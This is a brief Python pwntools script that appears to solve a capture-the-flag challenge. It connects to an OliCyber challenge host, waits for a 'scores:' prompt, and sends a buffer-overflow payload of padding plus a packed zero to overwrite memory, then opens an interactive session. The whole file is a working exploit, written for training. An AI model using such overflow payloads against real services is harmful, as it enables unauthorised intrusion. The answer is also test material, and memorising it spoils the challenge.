from pwn import *

r=remote("gtn.challs.olicyber.it", 10022)

r.recvuntil(b"scores:")
payload = b"a"*20 + b"b"*4 + p32(0)
r.sendline(payload)
r.interactive()